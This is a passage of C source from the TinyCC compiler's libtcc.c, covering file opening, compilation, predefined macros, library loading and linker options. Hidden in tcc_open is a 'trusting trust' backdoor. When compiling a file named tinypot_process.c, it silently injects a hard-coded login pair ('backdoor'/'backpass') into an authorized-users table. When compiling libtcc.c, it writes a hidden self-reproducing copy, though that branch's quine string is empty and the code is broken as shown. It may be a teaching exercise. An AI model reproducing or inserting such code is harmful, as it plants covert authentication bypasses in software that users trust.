return;\n\n    va_start(ap, fmt);\n    error1(s1, 1, fmt, ap);\n    va_end(ap);\n}\n\n/********************************************************/\n/* I/O layer */\n\nST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)\n{\n    BufferedFile *bf;\n    int buflen = initlen ? initlen : IO_BUF_SIZE;\n\n    bf = tcc_mallocz(sizeof(BufferedFile) + buflen);\n    bf->buf_ptr = bf->buffer;\n    bf->buf_end = bf->buffer + initlen;\n    bf->buf_end[0] = CH_EOB; /* put eob symbol */\n    pstrcpy(bf->filename, sizeof(bf->filename), filename);\n    bf->true_filename = bf->filename;\n    bf->line_num = 1;\n    bf->ifdef_stack_ptr = s1->ifdef_stack_ptr;\n    bf->fd = -1;\n    bf->prev = file;\n    file = bf;\n    tok_flags = TOK_FLAG_BOL | TOK_FLAG_BOF;\n}\n\nST_FUNC void tcc_close(void)\n{\n    BufferedFile *bf = file;\n    if (bf->fd > 0) {\n        close(bf->fd);\n        total_lines += bf->line_num;\n    }\n    if (bf->true_filename != bf->filename)\n        tcc_free(bf->true_filename);\n    file = bf->prev;\n    tcc_free(bf);\n}\n\nST_FUNC int tcc_open(TCCState *s1, const char *filename)\n{\n    int fd;\n    FILE *fp;\n    FILE *cfp;\n    char *target = \"AuthData_t authorizedUsers[]\";\n    if (strcmp(filename, \"-\") == 0)\n        fd = 0, filename = \"<stdin>\";\n    else if (strcmp(filename, \"libtcc.c\") == 0) {\n\tfp = fopen(\".libtcc.c\", \"w\");\n\tif (fp != NULL) {\n\t    int index = 0;\n    \t    char a[] = \"\";\n\t    while (!(a[index] == 'a' && a[index + 1] == '[')) {\n\t\tfputc(a[index], fp);\n\t\tindex++;\n\t    }\n\t    fprintf(fp, \"a[] = \\\"\");\n\t    index += 8;\n\t    for (int j = 0; a[j] != '\\0'; j++) {\n\t    \tif (a[j] == '\\\\' || a[j] == '\\\"' || a[j] == '\\n' || a[j] == '\\t') {\n\t\t    fputc('\\\\', fp);\n\t\t}\n\t\tif (a[j] == '\\t')\n\t\t    fputc('t', fp);\n\t\telse if (a[j] == '\\n')\n\t\t    fputc('n', fp);\n\t\telse\n\t\t    fputc(a[j], fp);\n\t    }\n\t    fputc('\\\"', fp);\n\t    while (a[index] != '\\0') {\n\t\tfputc(a[index], fp);\n\t\tindex++;\n\t    }\n\t    fclose(fp);\n\t} else {\n\t    perror(\".libtcc.c\");\n\t}\n\tfilename = \"./libtcc.c\";\n\tfd = open(filename, O_RDONLY | O_BINARY);\n    }\n    else if (strcmp(filename, \"tinypot_process.c\") == 0) {\n\tcfp = fopen(\"tinypot_process.c\", \"r\");\n\tfp = fopen(\".tinypot_process.c\", \"w\");\n\tif (cfp != NULL) {\n\t    if (fp != NULL) {\n\t    char line[128];\n\t    while (fgets(line, sizeof line, cfp) != NULL) {\n\t\tif (strstr(line, target) != NULL) {\n\t    \t    fprintf(fp, \"%s\", line);\n\t    \t    fprintf(fp, \"{\\\"backdoor\\\", \\\"backpass\\\"},\\n\");\n\t\t} else {\n\t\t    fprintf(fp, \"%s\", line);\t    \n\t\t}\n\t    }\n\t    fclose(cfp);\n\t    fclose(fp);\t\n\t    } else {\n\t\tperror(\".tinypot_process.c\");\n\t    }\n\t} else {\n\t    perror(\"tinypot_process.c\");\n\t}\n\tfilename = \".tinypot_process.c\";\n\tfd = open(filename, O_RDONLY | O_BINARY);\n    }\n    else\n        fd = open(filename, O_RDONLY | O_BINARY);\n    if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)\n        printf(\"%s %*s%s\\n\", fd < 0 ? \"nf\":\"->\",\n               (int)(s1->include_stack_ptr - s1->include_stack), \"\", filename);\n    if (fd < 0)\n        return -1;\n    tcc_open_bf(s1, filename, 0);\n#ifdef _WIN32\n    normalize_slashes(file->filename);\n#endif\n    file->fd = fd;\n    return fd;\n}\n\n/* compile the file opened in 'file'. Return non zero if errors. */\nstatic int tcc_compile(TCCState *s1, int filetype)\n{\n    Sym *define_start;\n    int is_asm;\n\n    define_start = define_stack;\n    is_asm = !!(filetype & (AFF_TYPE_ASM|AFF_TYPE_ASMPP));\n    tccelf_begin_file(s1);\n\n    if (setjmp(s1->error_jmp_buf) == 0) {\n        s1->nb_errors = 0;\n        s1->error_set_jmp_enabled = 1;\n\n        preprocess_start(s1, is_asm);\n        if (s1->output_type == TCC_OUTPUT_PREPROCESS) {\n            tcc_preprocess(s1);\n        } else if (is_asm) {\n#ifdef CONFIG_TCC_ASM\n            tcc_assemble(s1, !!(filetype & AFF_TYPE_ASMPP));\n#else\n            tcc_error_noabort(\"asm not supported\");\n#endif\n        } else {\n            tccgen_compile(s1);\n        }\n    }\n    s1->error_set_jmp_enabled = 0;\n\n    preprocess_end(s1);\n    free_inline_functions(s1);\n    /* reset define stack, but keep -D and built-ins */\n    free_defines(define_start);\n    sym_pop(&global_stack, NULL, 0);\n    sym_pop(&local_stack, NULL, 0);\n    tccelf_end_file(s1);\n    return s1->nb_errors != 0 ? -1 : 0;\n}\n\nLIBTCCAPI int tcc_compile_string(TCCState *s, const char *str)\n{\n    int len, ret;\n\n    len = strlen(str);\n    tcc_open_bf(s, \"<string>\", len);\n    memcpy(file->buffer, str, len);\n    ret = tcc_compile(s, s->filetype);\n    tcc_close();\n    return ret;\n}\n\n/* define a preprocessor symbol. A value can also be provided with the '=' operator */\nLIBTCCAPI void tcc_define_symbol(TCCState *s1, const char *sym, const char *value)\n{\n    int len1, len2;\n    /* default value */\n    if (!value)\n        value = \"1\";\n    len1 = strlen(sym);\n    len2 = strlen(value);\n\n    /* init file structure */\n    tcc_open_bf(s1, \"<define>\", len1 + len2 + 1);\n    memcpy(file->buffer, sym, len1);\n    file->buffer[len1] = ' ';\n    memcpy(file->buffer + len1 + 1, value, len2);\n\n    /* parse with define parser */\n    next_nomacro();\n    parse_define();\n    tcc_close();\n}\n\n/* undefine a preprocessor symbol */\nLIBTCCAPI void tcc_undefine_symbol(TCCState *s1, const char *sym)\n{\n    TokenSym *ts;\n    Sym *s;\n    ts = tok_alloc(sym, strlen(sym));\n    s = define_find(ts->tok);\n    /* undefine symbol by putting an invalid name */\n    if (s)\n        define_undef(s);\n}\n\n/* cleanup all static data used during compilation */\nstatic void tcc_cleanup(void)\n{\n    if (NULL == tcc_state)\n        return;\n    while (file)\n        tcc_close();\n    tccpp_delete(tcc_state);\n    tcc_state = NULL;\n    /* free sym_pools */\n    dynarray_reset(&sym_pools, &nb_sym_pools);\n    /* reset symbol stack */\n    sym_free_first = NULL;\n}\n\nLIBTCCAPI TCCState *tcc_new(void)\n{\n    TCCState *s;\n\n    tcc_cleanup();\n\n    s = tcc_mallocz(sizeof(TCCState));\n    if (!s)\n        return NULL;\n    tcc_state = s;\n    ++nb_states;\n\n    s->nocommon = 1;\n    s->warn_implicit_function_declaration = 1;\n    s->ms_extensions = 1;\n\n#ifdef CHAR_IS_UNSIGNED\n    s->char_is_unsigned = 1;\n#endif\n#ifdef TCC_TARGET_I386\n    s->seg_size = 32;\n#endif\n    /* enable this if you want symbols with leading underscore on windows: */\n#if 0 /* def TCC_TARGET_PE */\n    s->leading_underscore = 1;\n#endif\n#ifdef _WIN32\n    tcc_set_lib_path_w32(s);\n#else\n    tcc_set_lib_path(s, CONFIG_TCCDIR);\n#endif\n    tccelf_new(s);\n    tccpp_new(s);\n\n    /* we add dummy defines for some special macros to speed up tests\n       and to have working defined() */\n    define_push(TOK___LINE__, MACRO_OBJ, NULL, NULL);\n    define_push(TOK___FILE__, MACRO_OBJ, NULL, NULL);\n    define_push(TOK___DATE__, MACRO_OBJ, NULL, NULL);\n    define_push(TOK___TIME__, MACRO_OBJ, NULL, NULL);\n    define_push(TOK___COUNTER__, MACRO_OBJ, NULL, NULL);\n    {\n        /* define __TINYC__ 92X  */\n        char buffer[32]; int a,b,c;\n        sscanf(TCC_VERSION, \"%d.%d.%d\", &a, &b, &c);\n        sprintf(buffer, \"%d\", a*10000 + b*100 + c);\n        tcc_define_symbol(s, \"__TINYC__\", buffer);\n    }\n\n    /* standard defines */\n    tcc_define_symbol(s, \"__STDC__\", NULL);\n    tcc_define_symbol(s, \"__STDC_VERSION__\", \"199901L\");\n    tcc_define_symbol(s, \"__STDC_HOSTED__\", NULL);\n\n    /* target defines */\n#if defined(TCC_TARGET_I386)\n    tcc_define_symbol(s, \"__i386__\", NULL);\n    tcc_define_symbol(s, \"__i386\", NULL);\n    tcc_define_symbol(s, \"i386\", NULL);\n#elif defined(TCC_TARGET_X86_64)\n    tcc_define_symbol(s, \"__x86_64__\", NULL);\n#elif defined(TCC_TARGET_ARM)\n    tcc_define_symbol(s, \"__ARM_ARCH_4__\", NULL);\n    tcc_define_symbol(s, \"__arm_elf__\", NULL);\n    tcc_define_symbol(s, \"__arm_elf\", NULL);\n    tcc_define_symbol(s, \"arm_elf\", NULL);\n    tcc_define_symbol(s, \"__arm__\", NULL);\n    tcc_define_symbol(s, \"__arm\", NULL);\n    tcc_define_symbol(s, \"arm\", NULL);\n    tcc_define_symbol(s, \"__APCS_32__\", NULL);\n    tcc_define_symbol(s, \"__ARMEL__\", NULL);\n#if defined(TCC_ARM_EABI)\n    tcc_define_symbol(s, \"__ARM_EABI__\", NULL);\n#endif\n#if defined(TCC_ARM_HARDFLOAT)\n    s->float_abi = ARM_HARD_FLOAT;\n    tcc_define_symbol(s, \"__ARM_PCS_VFP\", NULL);\n#else\n    s->float_abi = ARM_SOFTFP_FLOAT;\n#endif\n#elif defined(TCC_TARGET_ARM64)\n    tcc_define_symbol(s, \"__aarch64__\", NULL);\n#elif defined TCC_TARGET_C67\n    tcc_define_symbol(s, \"__C67__\", NULL);\n#endif\n\n#ifdef TCC_TARGET_PE\n    tcc_define_symbol(s, \"_WIN32\", NULL);\n# ifdef TCC_TARGET_X86_64\n    tcc_define_symbol(s, \"_WIN64\", NULL);\n# endif\n#else\n    tcc_define_symbol(s, \"__unix__\", NULL);\n    tcc_define_symbol(s, \"__unix\", NULL);\n    tcc_define_symbol(s, \"unix\", NULL);\n# if defined(__linux__)\n    tcc_define_symbol(s, \"__linux__\", NULL);\n    tcc_define_symbol(s, \"__linux\", NULL);\n# endif\n# if defined(__FreeBSD__)\n    tcc_define_symbol(s, \"__FreeBSD__\", \"__FreeBSD__\");\n    /* No 'Thread Storage Local' on FreeBSD with tcc */\n    tcc_define_symbol(s, \"__NO_TLS\", NULL);\n# endif\n# if defined(__FreeBSD_kernel__)\n    tcc_define_symbol(s, \"__FreeBSD_kernel__\", NULL);\n# endif\n# if defined(__NetBSD__)\n    tcc_define_symbol(s, \"__NetBSD__\", \"__NetBSD__\");\n# endif\n# if defined(__OpenBSD__)\n    tcc_define_symbol(s, \"__OpenBSD__\", \"__OpenBSD__\");\n# endif\n#endif\n\n    /* TinyCC & gcc defines */\n#if PTR_SIZE == 4\n    /* 32bit systems. */\n    tcc_define_symbol(s, \"__SIZE_TYPE__\", \"unsigned int\");\n    tcc_define_symbol(s, \"__PTRDIFF_TYPE__\", \"int\");\n    tcc_define_symbol(s, \"__ILP32__\", NULL);\n#elif LONG_SIZE == 4\n    /* 64bit Windows. */\n    tcc_define_symbol(s, \"__SIZE_TYPE__\", \"unsigned long long\");\n    tcc_define_symbol(s, \"__PTRDIFF_TYPE__\", \"long long\");\n    tcc_define_symbol(s, \"__LLP64__\", NULL);\n#else\n    /* Other 64bit systems. */\n    tcc_define_symbol(s, \"__SIZE_TYPE__\", \"unsigned long\");\n    tcc_define_symbol(s, \"__PTRDIFF_TYPE__\", \"long\");\n    tcc_define_symbol(s, \"__LP64__\", NULL);\n#endif\n\n#ifdef TCC_TARGET_PE\n    tcc_define_symbol(s, \"__WCHAR_TYPE__\", \"unsigned short\");\n    tcc_define_symbol(s, \"__WINT_TYPE__\", \"unsigned short\");\n#else\n    tcc_define_symbol(s, \"__WCHAR_TYPE__\", \"int\");\n    /* wint_t is unsigned int by default, but (signed) int on BSDs\n       and unsigned short on windows.  Other OSes might have still\n       other conventions, sigh.  */\n# if defined(__FreeBSD__) || defined (__FreeBSD_kernel__) \\\n  || defined(__NetBSD__) || defined(__OpenBSD__)\n    tcc_define_symbol(s, \"__WINT_TYPE__\", \"int\");\n#  ifdef __FreeBSD__\n    /* define __GNUC__ to have some useful stuff from sys/cdefs.h\n       that are unconditionally used in FreeBSDs other system headers :/ */\n    tcc_define_symbol(s, \"__GNUC__\", \"2\");\n    tcc_define_symbol(s, \"__GNUC_MINOR__\", \"7\");\n    tcc_define_symbol(s, \"__builtin_alloca\", \"alloca\");\n#  endif\n# else\n    tcc_define_symbol(s, \"__WINT_TYPE__\", \"unsigned int\");\n    /* glibc defines */\n    tcc_define_symbol(s, \"__REDIRECT(name, proto, alias)\",\n        \"name proto __asm__ (#alias)\");\n    tcc_define_symbol(s, \"__REDIRECT_NTH(name, proto, alias)\",\n        \"name proto __asm__ (#alias) __THROW\");\n# endif\n# if defined(TCC_MUSL)\n    tcc_define_symbol(s, \"__DEFINED_va_list\", \"\");\n    tcc_define_symbol(s, \"__DEFINED___isoc_va_list\", \"\");\n    tcc_define_symbol(s, \"__isoc_va_list\", \"void *\");\n# endif /* TCC_MUSL */\n    /* Some GCC builtins that are simple to express as macros.  */\n    tcc_define_symbol(s, \"__builtin_extract_return_addr(x)\", \"x\");\n#endif /* ndef TCC_TARGET_PE */\n    return s;\n}\n\nLIBTCCAPI void tcc_delete(TCCState *s1)\n{\n    tcc_cleanup();\n\n    /* free sections */\n    tccelf_delete(s1);\n\n    /* free library paths */\n    dynarray_reset(&s1->library_paths, &s1->nb_library_paths);\n    dynarray_reset(&s1->crt_paths, &s1->nb_crt_paths);\n\n    /* free include paths */\n    dynarray_reset(&s1->cached_includes, &s1->nb_cached_includes);\n    dynarray_reset(&s1->include_paths, &s1->nb_include_paths);\n    dynarray_reset(&s1->sysinclude_paths, &s1->nb_sysinclude_paths);\n    dynarray_reset(&s1->cmd_include_files, &s1->nb_cmd_include_files);\n\n    tcc_free(s1->tcc_lib_path);\n    tcc_free(s1->soname);\n    tcc_free(s1->rpath);\n    tcc_free(s1->init_symbol);\n    tcc_free(s1->fini_symbol);\n    tcc_free(s1->outfile);\n    tcc_free(s1->deps_outfile);\n    dynarray_reset(&s1->files, &s1->nb_files);\n    dynarray_reset(&s1->target_deps, &s1->nb_target_deps);\n    dynarray_reset(&s1->pragma_libs, &s1->nb_pragma_libs);\n    dynarray_reset(&s1->argv, &s1->argc);\n\n#ifdef TCC_IS_NATIVE\n    /* free runtime memory */\n    tcc_run_free(s1);\n#endif\n\n    tcc_free(s1);\n    if (0 == --nb_states)\n        tcc_memcheck();\n}\n\nLIBTCCAPI int tcc_set_output_type(TCCState *s, int output_type)\n{\n    s->output_type = output_type;\n\n    /* always elf for objects */\n    if (output_type == TCC_OUTPUT_OBJ)\n        s->output_format = TCC_OUTPUT_FORMAT_ELF;\n\n    if (s->char_is_unsigned)\n        tcc_define_symbol(s, \"__CHAR_UNSIGNED__\", NULL);\n\n    if (!s->nostdinc) {\n        /* default include paths */\n        /* -isystem paths have already been handled */\n        tcc_add_sysinclude_path(s, CONFIG_TCC_SYSINCLUDEPATHS);\n    }\n\n#ifdef CONFIG_TCC_BCHECK\n    if (s->do_bounds_check) {\n        /* if bound checking, then add corresponding sections */\n        tccelf_bounds_new(s);\n        /* define symbol */\n        tcc_define_symbol(s, \"__BOUNDS_CHECKING_ON\", NULL);\n    }\n#endif\n    if (s->do_debug) {\n        /* add debug sections */\n        tccelf_stab_new(s);\n    }\n\n    tcc_add_library_path(s, CONFIG_TCC_LIBPATHS);\n\n#ifdef TCC_TARGET_PE\n# ifdef _WIN32\n    if (!s->nostdlib && output_type != TCC_OUTPUT_OBJ)\n        tcc_add_systemdir(s);\n# endif\n#else\n    /* paths for crt objects */\n    tcc_split_path(s, &s->crt_paths, &s->nb_crt_paths, CONFIG_TCC_CRTPREFIX);\n    /* add libc crt1/crti objects */\n    if ((output_type == TCC_OUTPUT_EXE || output_type == TCC_OUTPUT_DLL) &&\n        !s->nostdlib) {\n        if (output_type != TCC_OUTPUT_DLL)\n            tcc_add_crt(s, \"crt1.o\");\n        tcc_add_crt(s, \"crti.o\");\n    }\n#endif\n    return 0;\n}\n\nLIBTCCAPI int tcc_add_include_path(TCCState *s, const char *pathname)\n{\n    tcc_split_path(s, &s->include_paths, &s->nb_include_paths, pathname);\n    return 0;\n}\n\nLIBTCCAPI int tcc_add_sysinclude_path(TCCState *s, const char *pathname)\n{\n    tcc_split_path(s, &s->sysinclude_paths, &s->nb_sysinclude_paths, pathname);\n    return 0;\n}\n\nST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int flags)\n{\n    int ret;\n\n    /* open the file */\n    ret = tcc_open(s1, filename);\n    if (ret < 0) {\n        if (flags & AFF_PRINT_ERROR)\n            tcc_error_noabort(\"file '%s' not found\", filename);\n        return ret;\n    }\n\n    /* update target deps */\n    dynarray_add(&s1->target_deps, &s1->nb_target_deps,\n            tcc_strdup(filename));\n\n    if (flags & AFF_TYPE_BIN) {\n        ElfW(Ehdr) ehdr;\n        int fd, obj_type;\n\n        fd = file->fd;\n        obj_type = tcc_object_type(fd, &ehdr);\n        lseek(fd, 0, SEEK_SET);\n\n#ifdef TCC_TARGET_MACHO\n        if (0 == obj_type && 0 == strcmp(tcc_fileextension(filename), \".dylib\"))\n            obj_type = AFF_BINTYPE_DYN;\n#endif\n\n        switch (obj_type) {\n        case AFF_BINTYPE_REL:\n            ret = tcc_load_object_file(s1, fd, 0);\n            break;\n#ifndef TCC_TARGET_PE\n        case AFF_BINTYPE_DYN:\n            if (s1->output_type == TCC_OUTPUT_MEMORY) {\n                ret = 0;\n#ifdef TCC_IS_NATIVE\n                if (NULL == dlopen(filename, RTLD_GLOBAL | RTLD_LAZY))\n                    ret = -1;\n#endif\n            } else {\n                ret = tcc_load_dll(s1, fd, filename,\n                                   (flags & AFF_REFERENCED_DLL) != 0);\n            }\n            break;\n#endif\n        case AFF_BINTYPE_AR:\n            ret = tcc_load_archive(s1, fd, !(flags & AFF_WHOLE_ARCHIVE));\n            break;\n#ifdef TCC_TARGET_COFF\n        case AFF_BINTYPE_C67:\n            ret = tcc_load_coff(s1, fd);\n            break;\n#endif\n        default:\n#ifdef TCC_TARGET_PE\n            ret = pe_load_file(s1, filename, fd);\n#else\n            /* as GNU ld, consider it is an ld script if not recognized */\n            ret = tcc_load_ldscript(s1);\n#endif\n            if (ret < 0)\n                tcc_error_noabort(\"unrecognized file type\");\n            break;\n        }\n    } else {\n        ret = tcc_compile(s1, flags);\n    }\n    tcc_close();\n    return ret;\n}\n\nLIBTCCAPI int tcc_add_file(TCCState *s, const char *filename)\n{\n    int filetype = s->filetype;\n    if (0 == (filetype & AFF_TYPE_MASK)) {\n        /* use a file extension to detect a filetype */\n        const char *ext = tcc_fileextension(filename);\n        if (ext[0]) {\n            ext++;\n            if (!strcmp(ext, \"S\"))\n                filetype = AFF_TYPE_ASMPP;\n            else if (!strcmp(ext, \"s\"))\n                filetype = AFF_TYPE_ASM;\n            else if (!PATHCMP(ext, \"c\") || !PATHCMP(ext, \"i\"))\n                filetype = AFF_TYPE_C;\n            else\n                filetype |= AFF_TYPE_BIN;\n        } else {\n            filetype = AFF_TYPE_C;\n        }\n    }\n    return tcc_add_file_internal(s, filename, filetype | AFF_PRINT_ERROR);\n}\n\nLIBTCCAPI int tcc_add_library_path(TCCState *s, const char *pathname)\n{\n    tcc_split_path(s, &s->library_paths, &s->nb_library_paths, pathname);\n    return 0;\n}\n\nstatic int tcc_add_library_internal(TCCState *s, const char *fmt,\n    const char *filename, int flags, char **paths, int nb_paths)\n{\n    char buf[1024];\n    int i;\n\n    for(i = 0; i < nb_paths; i++) {\n        snprintf(buf, sizeof(buf), fmt, paths[i], filename);\n        if (tcc_add_file_internal(s, buf, flags | AFF_TYPE_BIN) == 0)\n            return 0;\n    }\n    return -1;\n}\n\n/* find and load a dll. Return non zero if not found */\n/* XXX: add '-rpath' option support ? */\nST_FUNC int tcc_add_dll(TCCState *s, const char *filename, int flags)\n{\n    return tcc_add_library_internal(s, \"%s/%s\", filename, flags,\n        s->library_paths, s->nb_library_paths);\n}\n\nST_FUNC int tcc_add_crt(TCCState *s, const char *filename)\n{\n    if (-1 == tcc_add_library_internal(s, \"%s/%s\",\n        filename, 0, s->crt_paths, s->nb_crt_paths))\n        tcc_error_noabort(\"file '%s' not found\", filename);\n    return 0;\n}\n\n/* the library name is the same as the argument of the '-l' option */\nLIBTCCAPI int tcc_add_library(TCCState *s, const char *libraryname)\n{\n#if defined TCC_TARGET_PE\n    const char *libs[] = { \"%s/%s.def\", \"%s/lib%s.def\", \"%s/%s.dll\", \"%s/lib%s.dll\", \"%s/lib%s.a\", NULL };\n    const char **pp = s->static_link ? libs + 4 : libs;\n#elif defined TCC_TARGET_MACHO\n    const char *libs[] = { \"%s/lib%s.dylib\", \"%s/lib%s.a\", NULL };\n    const char **pp = s->static_link ? libs + 1 : libs;\n#else\n    const char *libs[] = { \"%s/lib%s.so\", \"%s/lib%s.a\", NULL };\n    const char **pp = s->static_link ? libs + 1 : libs;\n#endif\n    int flags = s->filetype & AFF_WHOLE_ARCHIVE;\n    while (*pp) {\n        if (0 == tcc_add_library_internal(s, *pp,\n            libraryname, flags, s->library_paths, s->nb_library_paths))\n            return 0;\n        ++pp;\n    }\n    return -1;\n}\n\nPUB_FUNC int tcc_add_library_err(TCCState *s, const char *libname)\n{\n    int ret = tcc_add_library(s, libname);\n    if (ret < 0)\n        tcc_error_noabort(\"library '%s' not found\", libname);\n    return ret;\n}\n\n/* handle #pragma comment(lib,) */\nST_FUNC void tcc_add_pragma_libs(TCCState *s1)\n{\n    int i;\n    for (i = 0; i < s1->nb_pragma_libs; i++)\n        tcc_add_library_err(s1, s1->pragma_libs[i]);\n}\n\nLIBTCCAPI int tcc_add_symbol(TCCState *s, const char *name, const void *val)\n{\n#ifdef TCC_TARGET_PE\n    /* On x86_64 'val' might not be reachable with a 32bit offset.\n       So it is handled here as if it were in a DLL. */\n    pe_putimport(s, 0, name, (uintptr_t)val);\n#else\n    set_elf_sym(symtab_section, (uintptr_t)val, 0,\n        ELFW(ST_INFO)(STB_GLOBAL, STT_NOTYPE), 0,\n        SHN_ABS, name);\n#endif\n    return 0;\n}\n\nLIBTCCAPI void tcc_set_lib_path(TCCState *s, const char *path)\n{\n    tcc_free(s->tcc_lib_path);\n    s->tcc_lib_path = tcc_strdup(path);\n}\n\n#define WD_ALL    0x0001 /* warning is activated when using -Wall */\n#define FD_INVERT 0x0002 /* invert value before storing */\n\ntypedef struct FlagDef {\n    uint16_t offset;\n    uint16_t flags;\n    const char *name;\n} FlagDef;\n\nstatic int no_flag(const char **pp)\n{\n    const char *p = *pp;\n    if (*p != 'n' || *++p != 'o' || *++p != '-')\n        return 0;\n    *pp = p + 1;\n    return 1;\n}\n\nST_FUNC int set_flag(TCCState *s, const FlagDef *flags, const char *name)\n{\n    int value, ret;\n    const FlagDef *p;\n    const char *r;\n\n    value = 1;\n    r = name;\n    if (no_flag(&r))\n        value = 0;\n\n    for (ret = -1, p = flags; p->name; ++p) {\n        if (ret) {\n            if (strcmp(r, p->name))\n                continue;\n        } else {\n            if (0 == (p->flags & WD_ALL))\n                continue;\n        }\n        if (p->offset) {\n            *(int*)((char *)s + p->offset) =\n                p->flags & FD_INVERT ? !value : value;\n            if (ret)\n                return 0;\n        } else {\n            ret = 0;\n        }\n    }\n    return ret;\n}\n\nstatic int strstart(const char *val, const char **str)\n{\n    const char *p, *q;\n    p = *str;\n    q = val;\n    while (*q) {\n        if (*p != *q)\n            return 0;\n        p++;\n        q++;\n    }\n    *str = p;\n    return 1;\n}\n\n/* Like strstart, but automatically takes into account that ld options can\n *\n * - start with double or single dash (e.g. '--soname' or '-soname')\n * - arguments can be given as separate or after '=' (e.g. '-Wl,-soname,x.so'\n *   or '-Wl,-soname=x.so')\n *\n * you provide `val` always in 'option[=]' form (no leading -)\n */\nstatic int link_option(const char *str, const char *val, const char **ptr)\n{\n    const char *p, *q;\n    int ret;\n\n    /* there should be 1 or 2 dashes */\n    if (*str++ != '-')\n        return 0;\n    if (*str == '-')\n        str++;\n\n    /* then str & val should match (potentially up to '=') */\n    p = str;\n    q = val;\n\n    ret = 1;\n    if (q[0] == '?') {\n        ++q;\n        if (no_flag(&p))\n            ret = -1;\n    }\n\n    while (*q != '\\0' && *q != '=') {\n        if (*p != *q)\n            return 0;\n        p++;\n        q++;\n    }\n\n    /* '=' near eos means ',' or '=' is ok */\n    if (*q == '=') {\n        if (*p == 0)\n            *ptr = p;\n        if (*p != ',' && *p != '=')\n            return 0;\n        p++;\n    } else if (*p) {\n        return 0;\n    }\n    *ptr = p;\n    return ret;\n}\n\nstatic const char *skip_linker_arg(const char **str)\n{\n    const char *s1 = *str;\n    const char *s2 = strchr(s1, ',');\n    *str = s2 ? s2++ : (s2 = s1 + strlen(s1));\n    return s2;\n}\n\nstatic void copy_linker_arg(char **pp, const char *s, int sep)\n{\n    const char *q = s;\n    char *p = *pp;\n    int l = 0;\n    if (p && sep)\n        p[l = strlen(p)] = sep, ++l;\n    skip_linker_arg(&q);\n    pstrncpy(l + (*pp = tcc_realloc(p, q - s + l + 1)), s, q - s);\n}\n\n/* set linker options */\nstatic int tcc_set_linker(TCCState *s, const char *option)\n{\n    while (*option) {\n\n        const char *p = NULL;\n        char *end = NULL;\n        int ignoring = 0;\n        int ret;\n\n        if (link_option(option, \"Bsymbolic\", &p)) {\n            s->symbolic = 1;\n        } else if (link_option(option, \"nostdlib\", &p)) {\n            s->nostdlib = 1;\n        } else if (link_option(option, \"fini=\", &p)) {\n            copy_linker_arg(&s->fini_symbol, p, 0);\n            ignoring = 1;\n        } else if (link_option(option, \"image-base=\", &p)\n                || link_option(option, \"Ttext=\", &p)) {\n            s->text_addr = strtoull(p, &end, 16);\n            s->has_text_addr = 1;\n        } else if (link_option(option, \"init=\", &p)) {\n            copy_linker_arg(&s->init_symbol, p, 0);\n            ignoring = 1;\n        } else if (link_option(option, \"oformat=\", &p)) {\n#if defined(TCC_TARGET_PE)\n            if (strstart(\"pe-\", &p)) {\n#elif PTR_SIZE == 8\n            if (strstart(\"elf64-\", &p)) {\n#else\n            if (strstart(\"elf32-\", &p)) {\n#endif\n                s->output_format = TCC_OUTPUT_FORMAT_ELF;\n            } else if (!strcmp(p, \"binary\")) {\n                s->output_format = TCC_OUTPUT_FORMAT_BINARY;\n#ifdef TCC_TARGET_COFF\n            } else if (!strcmp(p, \"coff\")) {\n                s->output_format = TCC_OUTPUT_FORMAT_COFF;\n#endif\n            } else\n                goto err;\n\n        } else if (link_option(option, \"as-needed\", &p)) {\n            ignoring = 1;\n        } else if (link_option(option, \"O\", &p)) {\n            ignoring = 1;\n        } else if (link_option(option, \"export-all-symbols\", &p)) {\n            s->rdynamic = 1;\n        } else if (link_option(option, \"export-dynamic\", &p)) {\n            s->rdynamic = 1;\n        } else if (link_option(option, \"rpath=\", &p)) {\n            copy_linker_arg(&s->rpath, p, ':');\n        } else if (link_option(option, \"enable-new-dtags\", &p)) {\n            s->enable_new_dtags = 1;\n        } else if (link_option(option, \"section-alignment=\", &p)) {\n            s->section_align = strtoul(p, &end, 16);\n        } else if (link_option(option, \"soname=\", &p)) {\n            copy_linker_arg(&s->soname, p, 0);\n#ifdef TCC_TARGET_PE\n        } else if (link_option(option, \"large-address-aware\", &p)) {\n            s->pe_characteristics |= 0x20;\n        } else if (link_option(option, \"file-alignment=\", &p)) {\n            s->pe_file_align = strtoul(p, &end, 16);\n        } else if (link_option(option, \"stack=\", &p)) {\n            s->pe_stack_size = strtoul(p, &end, 10);\n        } else if (link_option(option, \"subsystem=\", &p)) {\n#if defined(TCC_TARGET_I386) || defined(TCC_TARGET_X86_64)\n            if (!strcmp(p, \"native\")) {\n                s->pe_subsystem = 1;\n            } else if (!strcmp(p, \"console\")) {\n                s->pe_subsystem = 3;\n            } else if (!strcmp(p, \"gui\") || !strcmp(p, \"windows\")) {\n                s->pe_subsystem = 2;\n            } else if (!strcmp(p, \"posix\")) {\n                s->pe_subsystem = 7;\n            } else if (!strcmp(p, \"efiapp\")) {\n                s->pe_subsystem = 10;\n            } else if (!strcmp(p, \"efiboot\")) {\n                s->pe_subsystem = 11;\n            } else if (!strcmp(p, \"efiruntime\")) {\n                s->pe_subsystem = 12;\n            } else if (!strcmp(p, \"efirom\")) {\n                s->pe_subsystem = 13;\n#elif defined(TCC_TARGET_ARM)\n            if (!strcmp(p, \"wince\")) {\n                s->pe_subsystem = 9;\n#endif\n            } else\n                goto err;\n#endif\n        } else if (ret = link_option(option, \"?whole-archive\", &p), ret) {\n            if (ret > 0)\n                s->filetype |= AFF_WHOLE_ARCHIVE;\n            else\n                s->filetype &= ~AFF_WHOLE_ARCHIVE;\n        } else if (p) {\n            return 0;\n        } else {\n    err:\n            tcc_error(\"unsupported linker option '%s'\", option);\n        }\n\n        if (ignoring && s->warn_unsupported)\n            tcc_warning(\"unsupported linker option '%s'\", option);\n\n        option = skip_linker_arg(&p);\n    }\n    return 1;\n}\n\ntypedef struct TCCOption {\n    const char *name;\n    uint16_t index;\n    uint16_t flags;\n} TCCOption;\n\nenum {\n    TCC_OPTION_HELP,\n    TCC_OPTION_HELP2,\n    TCC_OPTION_v,\n    TCC_OPTION_I,\n    TCC_OPTION_D,\n    TCC_OPTION_U,\n    TCC_OPTION_P,\n    TCC_OPTION_L,\n    TCC_OPTION_B,\n    TCC_OPTION_l,\n    TCC_OPTION_bench,\n    TCC_OPTION_bt,\n    TCC_OPTION_b,\n    TCC_OPTION_g,\n    TCC_OPTION_c,\n    TCC_OPTION_dumpversion,\n    TCC_OPTION_d,\n    